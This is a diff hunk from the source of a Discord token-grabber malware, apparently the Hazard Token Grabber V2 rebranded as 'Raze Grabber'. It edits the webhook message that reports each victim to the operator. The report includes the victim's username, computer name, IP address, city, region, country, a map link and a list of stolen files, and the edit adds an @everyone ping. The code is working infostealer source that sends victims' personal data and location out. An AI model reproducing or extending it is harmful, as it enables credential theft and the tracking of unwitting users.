@@ -325,7 +325,7 @@ class Hazard_Token_Grabber_V2:
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                         "icon_url": "https://cdn.discordapp.com/attachments/925197199036526653/930223348418502656/anime-cool.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Raze Grabber\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"**{os.getlogin()}** Just ran Raze Grabber ||@everyone|| \n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 2303786,
 
                     "thumbnail": {
